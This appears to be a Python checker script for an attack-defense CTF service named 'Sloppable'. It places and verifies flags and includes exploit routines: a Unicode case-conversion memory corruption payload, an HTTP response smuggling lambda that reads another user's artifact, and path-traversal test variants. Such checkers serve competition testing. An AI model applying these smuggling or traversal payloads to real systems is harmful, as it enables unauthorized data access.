from contextlib import asynccontextmanager
from enochecker3.chaindb import ChainDB
from enochecker3.enochecker import Enochecker
from enochecker3.types import (
    CheckerTaskMessage,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    TestCheckerTaskMessage,
    InternalErrorException,
    MumbleException,
    OfflineException,
    PutflagCheckerTaskMessage,
    CheckerMethod,
)
from enochecker3.utils import FlagSearcher, assert_in
from typing import Any, Optional, List, TypeVar, cast
from logging import LoggerAdapter
from httpx import AsyncClient

import httpx
import os
import random
import string
import base64
import slop


SERVICE_PORT = int(os.getenv("SERVICE_PORT", "9100"))

ResponseT = TypeVar("ResponseT")

checker = Enochecker("Sloppable", SERVICE_PORT)


def app():
    return checker.app


def auth_headers(session_token: str) -> dict[str, str]:
    return {"Authorization": f"Bearer {session_token}"}


def response_field(
    response: dict[str, Any], key: str, expected_type: type[ResponseT]
) -> ResponseT:
    value = response.get(key)
    if not isinstance(value, expected_type):
        raise MumbleException("Invalid REST response")
    return value


async def api_request(
    client: AsyncClient,
    logger: LoggerAdapter,
    method: str,
    path: str,
    *,
    session_token: Optional[str] = None,
    body: Optional[dict[str, Any]] = None,
) -> dict[str, Any]:
    try:
        response = await client.request(
            method,
            path,
            headers=auth_headers(session_token) if session_token else None,
            json=body,
        )
    except httpx.RequestError as error:
        raise OfflineException("Could not connect") from error

    if not response.is_success:
        logger.info(
            "REST request failed: %s %s returned %s: %s",
            method,
            path,
            response.status_code,
            response.text,
        )
        raise MumbleException("REST request failed")

    try:
        result = response.json()
    except ValueError as error:
        raise MumbleException("Invalid REST response") from error
    if not isinstance(result, dict):
        raise MumbleException("Invalid REST response")
    return result


async def create_session(client: AsyncClient, logger: LoggerAdapter) -> str:
    result = await api_request(client, logger, "POST", "/api/sessions")
    return response_field(result, "session_token", str)


async def write_file(
    client: AsyncClient,
    logger: LoggerAdapter,
    session_token: str,
    path: str,
    content: str,
) -> None:
    logger.info(f"Writing file\n{content}\nto {path}")

    await api_request(
        client,
        logger,
        "PUT",
        "/api/workspace/file",
        session_token=session_token,
        body={"path": path, "content": content},
    )


async def publish_workspace(
    client: AsyncClient,
    logger: LoggerAdapter,
    session_token: str,
    title: str,
) -> str:
    result = await api_request(
        client,
        logger,
        "POST",
        "/api/artifacts",
        session_token=session_token,
        body={"title": title},
    )
    return response_field(result, "artifact_id", str)


async def call_lambda(
    client: AsyncClient,
    logger: LoggerAdapter,
    session_token: str,
    artifact_id: str,
    name: str,
) -> str:
    result = await api_request(
        client,
        logger,
        "POST",
        f"/api/artifacts/{artifact_id}/lambdas/{name}/invoke",
        session_token=session_token,
        body={"args": {}},
    )
    return response_field(result, "result", str)


async def read_artifact(
    client: AsyncClient,
    logger: LoggerAdapter,
    session_token: str,
    artifact_id: str,
) -> dict[str, Any]:
    result = await api_request(
        client,
        logger,
        "GET",
        f"/api/artifacts/{artifact_id}",
        session_token=session_token,
    )
    response_field(result, "title", str)
    files = response_field(result, "files", list)
    if any(
        not isinstance(file, dict)
        or not isinstance(file.get("path"), str)
        or not isinstance(file.get("content"), str)
        for file in files
    ):
        raise MumbleException("Invalid REST response")
    return result


random.seed(int.from_bytes(os.urandom(16), "little"))

noise_alph = string.ascii_letters + string.digits


def noise(nmin: int, nmax: int) -> str:
    n = random.randint(nmin, nmax)
    return "".join(random.choice(noise_alph) for _ in range(n))


@checker.putflag(0)
async def putflag_lambda(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    session_token = await create_session(client, logger)
    varnames = list(string.ascii_letters)
    random.shuffle(varnames)
    varnames = varnames[:len(task.flag)]

    vars = list(zip(varnames, task.flag))
    random.shuffle(vars)

    await write_file(
        client,
        logger,
        session_token,
        "lambdas/flag.slop",
        f"""
Response main(Request r) {{
    {'\n    '.join(f'string {v} = "{f}";' for v, f in vars)}
    return Response(btoa({'+'.join(varnames)}), {{}});
}}""",
    )

    artifact_id = await publish_workspace(client, logger, session_token, "Flag")

    await db.set("info", {"token": session_token, "artifact": artifact_id})
    logger.info(session_token + " / " + artifact_id)

    return artifact_id


@checker.putflag(1)
async def putflag_artifact(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    session_token = await create_session(client, logger)

    await write_file(client, logger, session_token, "flag", task.flag)

    artifact_id = await publish_workspace(client, logger, session_token, "Flag")

    await db.set("info", {"token": session_token, "artifact": artifact_id})

    return artifact_id


@checker.getflag(0)
async def getflag_lambda(
    task: GetflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    try:
        info = await db.get("info")
        session_token = info["token"]
        artifact_id = info["artifact"]
    except KeyError:
        raise MumbleException("Database info missing")

    logger.info(f"Executing lambda from {artifact_id}:flag")

    content = await call_lambda(client, logger, session_token, artifact_id, "flag")

    assert_in(base64.b64encode(task.flag.encode()).decode(), content, "Flag missing")


@checker.getflag(1)
async def getflag_artifact(
    task: GetflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    try:
        info = await db.get("info")
        session_token = info["token"]
        artifact_id = info["artifact"]
    except KeyError:
        raise MumbleException("Database info missing")

    call_result = await read_artifact(client, logger, session_token, artifact_id)
    flag_content = next(
        (
            cast(str, file["content"])
            for file in cast(list[dict[str, Any]], call_result["files"])
            if file["path"] == "flag"
        ),
        None,
    )
    if not flag_content:
        raise MumbleException("Flag missing")

    assert_in(task.flag, flag_content, "Flag missing")


@checker.putnoise(0)
async def putnoise_artifact(
    logger: LoggerAdapter, client: AsyncClient, db: ChainDB
) -> None:
    session_token = await create_session(client, logger)
    files = {}

    w = slop.build_workspace([])
    for filename, content in w.files.items():
        files[filename] = content
        await write_file(client, logger, session_token, filename, content)

    for fname, f in w.lambdas.items():
        filename = f'lambdas/{fname}.slop'

        await write_file(client, logger, session_token, filename, f.content)

    title = noise(4, 16)
    artifact_id = await publish_workspace(client, logger, session_token, title)

    await db.set(
        "noise",
        {
            "token": session_token,
            "artifact": artifact_id,
            "title": title,
            "files": files
        },
    )

@checker.putnoise(1)
async def putnoise_lambda(
    logger: LoggerAdapter, client: AsyncClient, db: ChainDB
) -> None:
    session_token = await create_session(client, logger)

    artifacts: List[slop.Artifact] = []
    for i in range(random.randint(1, 4)):
        w = slop.build_workspace(artifacts)
        for filename, content in w.files.items():
            await write_file(client, logger, session_token, filename, content)

        for fname, f in w.lambdas.items():
            filename = f'lambdas/{fname}.slop'

            await write_file(client, logger, session_token, filename, f.content)

        title = noise(4, 16)
        artifact_id = await publish_workspace(client, logger, session_token, title)
        artifact = slop.Artifact(artifact_id)
        artifact.files = w.files
        artifact.lambdas = w.lambdas
        artifacts.append(artifact)

    # TODO: sharing?

    artifact = random.choice(artifacts)
    await db.set(
        "noise",
        {
            "token": session_token,
            "artifact": artifact.id,
            "lambda": list(artifact.lambdas.keys()),
            "output": [x.output for x in artifact.lambdas.values()],
        },
    )


@checker.getnoise(0)
async def getnoise_artifact(
    logger: LoggerAdapter, client: AsyncClient, db: ChainDB
) -> None:
    try:
        info = await db.get("noise")
        session_token = info["token"]
        artifact_id = info["artifact"]
        expected_title = info["title"]
        expected_files = info["files"]
    except (KeyError, TypeError):
        raise MumbleException("Database info missing")

    artifact = await read_artifact(client, logger, session_token, artifact_id)
    files = {
        file["path"]: file["content"] for file in artifact["files"]
    }
    logger.info(repr(artifact))
    if artifact["title"] != expected_title:
        raise MumbleException("Artifact invalid")
    if files != expected_files:
        logger.info(f"Files do not match: {files} != {expected_files}")
        raise MumbleException("Artifact invalid")


@checker.getnoise(1)
async def getnoise_lambda(
    logger: LoggerAdapter, client: AsyncClient, db: ChainDB
) -> None:
    try:
        info = await db.get("noise")
        session_token = info["token"]
        artifact_id = info["artifact"]
        expected_output = info["output"]
        lambda_name = info["lambda"]
    except (KeyError, TypeError):
        raise MumbleException("Database info missing")

    for _ in range(random.randint(1, 5)):
        i = random.randint(0, len(lambda_name) - 1)
        logger.info(f"Calling lammda {i}: {lambda_name[i]}")

        output = await call_lambda(client, logger, session_token, artifact_id, lambda_name[i])

        if output != expected_output[i]:
            logger.info("Running lambda failed: %r != %r", output, expected_output[i])
            raise MumbleException("Lambda result wrong")


@checker.havoc(0)
async def havoc(logger: LoggerAdapter, client: AsyncClient) -> None:
    result = await api_request(client, logger, "GET", "/health")
    if response_field(result, "status", str) != "ok":
        raise MumbleException("Havoc failed")


@checker.exploit(0, 0)
async def exploit_uppercase_explosion(
    task: ExploitCheckerTaskMessage,
    logger: LoggerAdapter,
    searcher: FlagSearcher,
    client: AsyncClient,
) -> Optional[str]:
    if task.attack_info == "":
        raise InternalErrorException("Missing attack info")

    session_token = await create_session(client, logger)

    await write_file(
        client,
        logger,
        session_token,
        "lambdas/exploit.slop",
        f"""
Response main(Request r) {{
    string target = "flag";
    string vuln = "ΐΐΐΐΐΐΐΐΐΐ{task.attack_info}";
    string fill = "aa";
    uppercase(vuln);
    lowercase(vuln);

    return Response(atob(spc(target)), {{}});
}}
    """,
    )

    artifact_id = await publish_workspace(
        client, logger, session_token, "uppercase_lowercase_explosion"
    )

    content = await call_lambda(client, logger, session_token, artifact_id, "exploit")
    logger.info(content)

    flag = searcher.search_flag(content)
    return (flag or b"").decode(errors="replace")


@checker.exploit(1, 1)
async def exploit_response_smuggling(
    task: ExploitCheckerTaskMessage,
    logger: LoggerAdapter,
    searcher: FlagSearcher,
    client: AsyncClient,
) -> Optional[str]:
    if task.attack_info == "":
        raise InternalErrorException("Missing attack info")

    session_token = await create_session(client, logger)

    await write_file(
        client,
        logger,
        session_token,
        "lambdas/exploit.slop",
        f"""
Response main(Request req) {{
	spc("vuln");

	return Response(read_artifact("{task.attack_info}:flag"), {{}});
}}
    """,
    )

    await write_file(
        client,
        logger,
        session_token,
        "lambdas/vuln.slop",
        """
Response main(Request req) {
    return Response("HTTP/1.1 200 OK\r\nContent-length: 2\r\n\r\nOK", {"Content-Length": "0"});
}
    """,
    )

    artifact_id = await publish_workspace(
        client, logger, session_token, "response_smuggling"
    )

    for attempt in range(10):
        content = await call_lambda(
            client, logger, session_token, artifact_id, "exploit"
        )
        flag = searcher.search_flag(content)
        if flag:
            return flag.decode(errors="replace")
        logger.info("Smuggling attempt %d missed, retrying", attempt + 1)

    return ""


# Shouldn't pass: Cross exploit from flagstore 2 to 1 should not be allowed
# This is not supported by enochecker_test, therefore we have to build he test harness ourselves
from enochecker_test.flagregex import generate_from_regex, DEFAULT_FLAG_REGEX

@checker.test(0)
async def exploit_response_smuggling_artifact_read_fails(
    task: TestCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> Optional[str]:
    putflag_task = PutflagCheckerTaskMessage(
        flag = generate_from_regex(DEFAULT_FLAG_REGEX),
        method = CheckerMethod.PUTFLAG,
        task_id = task.task_id,
        address = task.address,
        team_id = task.team_id,
        team_name = task.team_name,
        current_round_id = task.current_round_id,
        related_round_id = task.current_round_id,
        flag_regex = DEFAULT_FLAG_REGEX,
        variantId = 0,
        timeout = task.timeout,
        round_length = task.round_length,
        task_chain_id = task.task_chain_id,
    )
    attack_info = await putflag_lambda(
        putflag_task,
        logger,
        client,
        db,
    )
    if attack_info == "":
        raise InternalErrorException("Missing attack info")

    session_token = await create_session(client, logger)

    await write_file(
        client,
        logger,
        session_token,
        "lambdas/exploit1.slop",
        f"""
Response main(Request req) {{
	spc("vuln");

	return Response(read_artifact("{attack_info}:lambdas/flag.slop"), {{}});
}}
    """,
    )

    await write_file(
        client,
        logger,
        session_token,
        "lambdas/exploit2.slop",
        f"""
Response main(Request req) {{
	spc("vuln");

	return Response(read_artifact("{attack_info}:/lambdas/flag.slop"), {{}});
}}
    """,
    )

    await write_file(
        client,
        logger,
        session_token,
        "lambdas/exploit3.slop",
        f"""
Response main(Request req) {{
	spc("vuln");

	return Response(read_artifact("{attack_info}:a/../lambdas/flag.slop"), {{}});
}}
    """,
    )

    await write_file(
        client,
        logger,
        session_token,
        "lambdas/vuln.slop",
        """
Response main(Request req) {
    return Response("HTTP/1.1 200 OK\r\nContent-length: 2\r\n\r\nOK", {"Content-Length": "0"});
}
    """,
    )

    artifact_id = await publish_workspace(
        client, logger, session_token, "response_smuggling"
    )

    for attempt in range(10):
        for explname in ["exploit1", "exploit2", "exploit3"]:
            content = await call_lambda(
                client, logger, session_token, artifact_id, explname
            )
            if "btoa" in content:
                raise InternalErrorException("Flag found for: " + explname)
        logger.info("Smuggling attempt %d missed, retrying", attempt + 1)

    return ""

if __name__ == "__main__":
    checker.run()
